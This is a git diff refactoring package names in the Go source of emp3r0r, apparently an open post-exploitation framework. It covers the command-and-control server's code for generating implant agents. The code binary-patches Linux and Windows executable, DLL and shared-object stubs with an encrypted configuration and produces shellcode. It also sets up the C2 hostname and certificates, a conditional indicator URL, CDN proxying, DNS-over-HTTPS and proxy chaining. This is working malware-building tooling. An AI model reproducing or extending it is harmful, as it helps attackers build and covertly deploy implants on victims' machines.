@@ -10,11 +10,11 @@ import (
 
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/base/network"
 	"github.com/jm33-m0/emp3r0r/core/internal/cc/server"
-	"github.com/jm33-m0/emp3r0r/core/internal/emp3r0r_def"
-	"github.com/jm33-m0/emp3r0r/core/internal/runtime_def"
-	"github.com/jm33-m0/emp3r0r/core/internal/tun"
+	"github.com/jm33-m0/emp3r0r/core/internal/def"
+	"github.com/jm33-m0/emp3r0r/core/internal/live"
+	"github.com/jm33-m0/emp3r0r/core/internal/transport"
+	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
 	"github.com/jm33-m0/emp3r0r/core/lib/donut"
-	"github.com/jm33-m0/emp3r0r/core/lib/emp3r0r_crypto"
 	"github.com/jm33-m0/emp3r0r/core/lib/logging"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 	"github.com/spf13/cobra"
@@ -96,7 +96,7 @@ func CmdGenerateAgent(cmd *cobra.Command, args []string) {
 	// read and encrypt config file
 	encryptedJSONBytes, err := readAndEncryptConfig()
 	if err != nil {
-		logging.Errorf("Failed to encrypt %s: %v", runtime_def.EmpConfigFile, err)
+		logging.Errorf("Failed to encrypt %s: %v", live.EmpConfigFile, err)
 		return
 	}
 
@@ -106,17 +106,17 @@ func CmdGenerateAgent(cmd *cobra.Command, args []string) {
 		logging.Errorf("Read stub: %v", err)
 		return
 	}
-	sep := bytes.Repeat(emp3r0r_def.OneTimeMagicBytes, 2)
+	sep := bytes.Repeat(def.OneTimeMagicBytes, 2)
 
 	// payload
 	config_payload := append(sep, encryptedJSONBytes...)
 	config_payload = append(config_payload, sep...)
 	// binary patching, we need to patch the stub file at emp3r0r_def.AgentConfig, which is 4096 bytes long
-	if len(config_payload) < len(emp3r0r_def.AgentConfig) {
+	if len(config_payload) < len(def.AgentConfig) {
 		// pad with 0x00
-		config_payload = append(config_payload, bytes.Repeat([]byte{0x00}, len(emp3r0r_def.AgentConfig)-len(config_payload))...)
-	} else if len(config_payload) > len(emp3r0r_def.AgentConfig) {
-		logging.Errorf("Config payload is too large, %d bytes, max %d bytes", len(config_payload), len(emp3r0r_def.AgentConfig))
+		config_payload = append(config_payload, bytes.Repeat([]byte{0x00}, len(def.AgentConfig)-len(config_payload))...)
+	} else if len(config_payload) > len(def.AgentConfig) {
+		logging.Errorf("Config payload is too large, %d bytes, max %d bytes", len(config_payload), len(def.AgentConfig))
 		return
 	}
 	// fill in
@@ -143,8 +143,8 @@ func CmdGenerateAgent(cmd *cobra.Command, args []string) {
 
 	// done
 	logging.Successf("Generated %s from %s and %s",
-		outfile, stubFile, runtime_def.EmpConfigFile)
-	logging.Debugf("OneTimeMagicBytes is %x", emp3r0r_def.OneTimeMagicBytes)
+		outfile, stubFile, live.EmpConfigFile)
+	logging.Debugf("OneTimeMagicBytes is %x", def.OneTimeMagicBytes)
 
 	if payload_type == PayloadTypeWindowsExecutable {
 		// generate shellcode for the agent binary
@@ -182,22 +182,22 @@ func generateFilePaths(payload_type, arch_choice string, now time.Time) (stubFil
 	case PayloadTypeLinuxExecutable:
 		stubFile = fmt.Sprintf("stub-%s", arch_choice)
 		outfile = fmt.Sprintf("%s/agent_linux_%s_%d-%d-%d_%d-%d-%d",
-			runtime_def.EmpWorkSpace, arch_choice,
+			live.EmpWorkSpace, arch_choice,
 			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
 	case PayloadTypeWindowsExecutable:
 		stubFile = fmt.Sprintf("stub-win-%s", arch_choice)
 		outfile = fmt.Sprintf("%s/agent_windows_%s_%d-%d-%d_%d-%d-%d.exe",
-			runtime_def.EmpWorkSpace, arch_choice,
+			live.EmpWorkSpace, arch_choice,
 			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
 	case PayloadTypeWindowsDLL:
 		stubFile = fmt.Sprintf("stub-win-%s.dll", arch_choice)
 		outfile = fmt.Sprintf("%s/agent_windows_%s_%d-%d-%d_%d-%d-%d.dll",
-			runtime_def.EmpWorkSpace, arch_choice,
+			live.EmpWorkSpace, arch_choice,
 			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
 	case PayloadTypeLinuxSO:
 		stubFile = fmt.Sprintf("stub-%s.so", arch_choice)
 		outfile = fmt.Sprintf("%s/agent_linux_so_%s_%d-%d-%d_%d-%d-%d.so",
-			runtime_def.EmpWorkSpace, arch_choice,
+			live.EmpWorkSpace, arch_choice,
 			now.Year(), now.Month(), now.Day(), now.Hour(), now.Minute(), now.Second())
 	default:
 		logging.Errorf("Unsupported: '%s'", payload_type)
@@ -207,15 +207,15 @@ func generateFilePaths(payload_type, arch_choice string, now time.Time) (stubFil
 
 func readAndEncryptConfig() ([]byte, error) {
 	// read file
-	jsonBytes, err := os.ReadFile(runtime_def.EmpConfigFile)
+	jsonBytes, err := os.ReadFile(live.EmpConfigFile)
 	if err != nil {
 		return nil, fmt.Errorf("parsing def.EmpConfigFile config file: %v", err)
 	}
 
 	// encrypt
-	encryptedJSONBytes, err := emp3r0r_crypto.AES_GCM_Encrypt(emp3r0r_def.OneTimeMagicBytes, jsonBytes)
+	encryptedJSONBytes, err := crypto.AES_GCM_Encrypt(def.OneTimeMagicBytes, jsonBytes)
 	if err != nil {
-		return nil, fmt.Errorf("failed to encrypt %s: %v", runtime_def.EmpConfigFile, err)
+		return nil, fmt.Errorf("failed to encrypt %s: %v", live.EmpConfigFile, err)
 	}
 
 	return encryptedJSONBytes, nil
@@ -253,27 +253,27 @@ func MakeConfig(cmd *cobra.Command) (err error) {
 
 	// read existing config when possible
 	var config_map map[string]interface{}
-	if util.IsExist(runtime_def.EmpConfigFile) {
-		logging.Infof("Reading config from existing %s", runtime_def.EmpConfigFile)
-		jsonData, err := os.ReadFile(runtime_def.EmpConfigFile)
+	if util.IsExist(live.EmpConfigFile) {
+		logging.Infof("Reading config from existing %s", live.EmpConfigFile)
+		jsonData, err := os.ReadFile(live.EmpConfigFile)
 		if err != nil {
-			return fmt.Errorf("failed to read %s: %v", runtime_def.EmpConfigFile, err)
+			return fmt.Errorf("failed to read %s: %v", live.EmpConfigFile, err)
 		}
 		// load to map
 		err = json.Unmarshal(jsonData, &config_map)
 		if err != nil {
-			return fmt.Errorf("parsing existing %s: %v", runtime_def.EmpConfigFile, err)
+			return fmt.Errorf("parsing existing %s: %v", live.EmpConfigFile, err)
 		}
 	}
 
 	// CC names and certs
-	runtime_def.RuntimeConfig.CCHost = cc_host
-	logging.Printf("C2 server name: %s", runtime_def.RuntimeConfig.CCHost)
-	existing_names := tun.NamesInCert(runtime_def.ServerCrtFile)
+	live.RuntimeConfig.CCHost = cc_host
+	logging.Printf("C2 server name: %s", live.RuntimeConfig.CCHost)
+	existing_names := transport.NamesInCert(live.ServerCrtFile)
 	cc_hosts := existing_names
 	exists := false
 	for _, c2_name := range existing_names {
-		if c2_name == runtime_def.RuntimeConfig.CCHost {
+		if c2_name == live.RuntimeConfig.CCHost {
 			exists = true
 			break
 		}
@@ -281,23 +281,23 @@ func MakeConfig(cmd *cobra.Command) (err error) {
 	// if user is requesting a new server name, server cert needs to be re-generated
 	if !exists {
 		logging.Warningf("Name '%s' is not covered by our server cert, re-generating",
-			runtime_def.RuntimeConfig.CCHost)
-		cc_hosts = append(cc_hosts, runtime_def.RuntimeConfig.CCHost) // append new name
+			live.RuntimeConfig.CCHost)
+		cc_hosts = append(cc_hosts, live.RuntimeConfig.CCHost) // append new name
 		// remove old certs
-		os.RemoveAll(runtime_def.ServerCrtFile)
-		os.RemoveAll(runtime_def.ServerKeyFile)
-		_, err = tun.GenCerts(cc_hosts, runtime_def.ServerCrtFile, runtime_def.ServerKeyFile, false)
+		os.RemoveAll(live.ServerCrtFile)
+		os.RemoveAll(live.ServerKeyFile)
+		_, err = transport.GenCerts(cc_hosts, live.ServerCrtFile, live.ServerKeyFile, false)
 		if err != nil {
 			return fmt.Errorf("failed to generate certs: %v", err)
 		}
 		err = network.EmpTLSServer.Shutdown(network.EmpTLSServerCtx)
 		if err != nil {
 			return fmt.Errorf("%v. You will need to restart emp3r0r C2 server to apply name '%s'",
-				err, runtime_def.RuntimeConfig.CCHost)
+				err, live.RuntimeConfig.CCHost)
 		} else {
-			logging.Warningf("Restarting C2 TLS service at port %s to apply new server cert", runtime_def.RuntimeConfig.CCPort)
+			logging.Warningf("Restarting C2 TLS service at port %s to apply new server cert", live.RuntimeConfig.CCPort)
 
-			c2_names := tun.NamesInCert(runtime_def.ServerCrtFile)
+			c2_names := transport.NamesInCert(live.ServerCrtFile)
 			if len(c2_names) <= 0 {
 				return fmt.Errorf("no valid host names in server cert")
 			}
@@ -308,46 +308,46 @@ func MakeConfig(cmd *cobra.Command) (err error) {
 	}
 
 	// CC indicator
-	runtime_def.RuntimeConfig.CCIndicatorURL = indicator_url
-	if runtime_def.RuntimeConfig.CCIndicatorURL != "" {
-		runtime_def.RuntimeConfig.CCIndicatorWaitMin = indicator_wait_min
-		runtime_def.RuntimeConfig.CCIndicatorWaitMax = indicator_wait_max
+	live.RuntimeConfig.CCIndicatorURL = indicator_url
+	if live.RuntimeConfig.CCIndicatorURL != "" {
+		live.RuntimeConfig.CCIndicatorWaitMin = indicator_wait_min
+		live.RuntimeConfig.CCIndicatorWaitMax = indicator_wait_max
 		logging.Printf("Remember to enable your indicator at %s. Agents will wait between %d to %d seconds for conditional C2 connection",
-			runtime_def.RuntimeConfig.CCIndicatorURL, runtime_def.RuntimeConfig.CCIndicatorWaitMin, runtime_def.RuntimeConfig.CCIndicatorWaitMax)
+			live.RuntimeConfig.CCIndicatorURL, live.RuntimeConfig.CCIndicatorWaitMin, live.RuntimeConfig.CCIndicatorWaitMax)
 	}
 
 	// Internet check
-	runtime_def.RuntimeConfig.EnableNCSI = ncsi
-	if runtime_def.RuntimeConfig.EnableNCSI {
+	live.RuntimeConfig.EnableNCSI = ncsi
+	if live.RuntimeConfig.EnableNCSI {
 		logging.Printf("NCSI is enabled")
 	}
 
 	// CDN proxy
-	runtime_def.RuntimeConfig.CDNProxy = cdn_proxy
-	if runtime_def.RuntimeConfig.CDNProxy != "" {
-		logging.Printf("Using CDN proxy %s", runtime_def.RuntimeConfig.CDNProxy)
+	live.RuntimeConfig.CDNProxy = cdn_proxy
+	if live.RuntimeConfig.CDNProxy != "" {
+		logging.Printf("Using CDN proxy %s", live.RuntimeConfig.CDNProxy)
 	}
 
-	runtime_def.RuntimeConfig.UseKCP = kcp
+	live.RuntimeConfig.UseKCP = kcp
 	if kcp {
 		logging.Printf("Using KCP")
 	}
 
 	// agent proxy for c2 transport
-	runtime_def.RuntimeConfig.C2TransportProxy = c2transport_proxy
-	if runtime_def.RuntimeConfig.C2TransportProxy != "" {
-		logging.Printf("Using C2 transport proxy %s", runtime_def.RuntimeConfig.C2TransportProxy)
+	live.RuntimeConfig.C2TransportProxy = c2transport_proxy
+	if live.RuntimeConfig.C2TransportProxy != "" {
+		logging.Printf("Using C2 transport proxy %s", live.RuntimeConfig.C2TransportProxy)
 	}
 
-	runtime_def.RuntimeConfig.DoHServer = doh_server
-	if runtime_def.RuntimeConfig.DoHServer != "" {
-		logging.Printf("Using DoH server %s", runtime_def.RuntimeConfig.DoHServer)
+	live.RuntimeConfig.DoHServer = doh_server
+	if live.RuntimeConfig.DoHServer != "" {
+		logging.Printf("Using DoH server %s", live.RuntimeConfig.DoHServer)
 	}
 	if !proxy_chain {
-		runtime_def.RuntimeConfig.ProxyChainBroadcastIntervalMax = 0
+		live.RuntimeConfig.ProxyChainBroadcastIntervalMax = 0
 		logging.Printf("Proxy chain is disabled")
 	}
 
 	// save emp3r0r.json
-	return runtime_def.SaveConfigJSON()
+	return live.SaveConfigJSON()
 }
